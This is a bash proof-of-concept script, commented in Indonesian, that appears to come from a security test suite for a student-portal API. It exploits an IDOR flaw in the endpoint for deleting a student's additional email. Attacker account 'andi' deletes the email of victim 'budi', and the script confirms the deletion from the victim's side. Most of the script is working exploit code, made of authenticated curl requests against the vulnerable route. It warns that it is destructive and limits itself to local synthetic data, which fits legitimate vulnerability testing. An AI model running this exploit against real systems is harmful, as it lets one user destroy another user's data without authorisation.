#!/usr/bin/env bash
# S8 - IDOR hapus email tambahan milik mahasiswa lain (DELETE /api/mahasiswa/me/email/:id)
# Sink: src/models/profilModel.js removeEmail() -> DELETE ... WHERE id = $1 (mahasiswa_id diabaikan)
# Prasyarat: andi (penyerang) tahu atau menebak UUID baris email_mahasiswa milik budi.
# Ini DESTRUKTIF: menghapus data sungguhan. Hanya jalankan di data sintetis lokal.
set -euo pipefail
cd "$(dirname "$0")"
source ./00-login.sh
B="$BASE_URL"; ANH="Authorization: Bearer $ANDI_TOKEN"; BUH="Authorization: Bearer $BUDI_TOKEN"

echo "== Cari email tambahan milik budi lewat ekspor data miliknya sendiri =="
EMAIL_ID=$(curl -s -m 10 "$B/api/mahasiswa/me/ekspor" -H "$BUH" \
  | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>{const j=JSON.parse(d);const e=j.data.email_tambahan[0];if(!e)process.exit(1);process.stdout.write(e.id)})") || true

if [ -z "${EMAIL_ID:-}" ]; then
  echo "Budi belum punya email tambahan, membuat satu..."
  curl -s -m 10 -X POST "$B/api/mahasiswa/me/email" -H "$BUH" -H 'Content-Type: application/json' \
    -d '{"tipe":"pribadi","email":"budi.poc@contoh.test"}' >/dev/null
  EMAIL_ID=$(curl -s -m 10 "$B/api/mahasiswa/me/ekspor" -H "$BUH" \
    | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>process.stdout.write(JSON.parse(d).data.email_tambahan[0].id))")
fi
echo "ID email budi: $EMAIL_ID"

echo "== Kontrol negatif: andi hapus ID acak (harus 404) =="
curl -s -m 10 -X DELETE "$B/api/mahasiswa/me/email/00000000-0000-0000-0000-000000000000" -H "$ANH" -w " | HTTP %{http_code}\n"

echo "== S8: andi hapus email MILIK BUDI =="
RESP=$(curl -s -m 10 -X DELETE "$B/api/mahasiswa/me/email/$EMAIL_ID" -H "$ANH" -w "\nHTTP %{http_code}")
echo "$RESP"
CODE=$(echo "$RESP" | tail -1 | grep -oE '[0-9]{3}')

echo "== Verifikasi dari sisi korban: email budi sudah hilang? =="
curl -s -m 10 "$B/api/mahasiswa/me/ekspor" -H "$BUH" \
  | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>{const j=JSON.parse(d);console.log('email_tambahan budi sekarang:',JSON.stringify(j.data.email_tambahan))})"

echo
if [ "$CODE" = "200" ]; then
  echo "KESIMPULAN: TERBUKTI. Andi (bukan pemilik) berhasil menghapus email tambahan milik Budi, dikonfirmasi hilang dari data Budi sendiri."
else
  echo "KESIMPULAN: TIDAK TERBUKTI pada percobaan ini (HTTP $CODE)."
fi
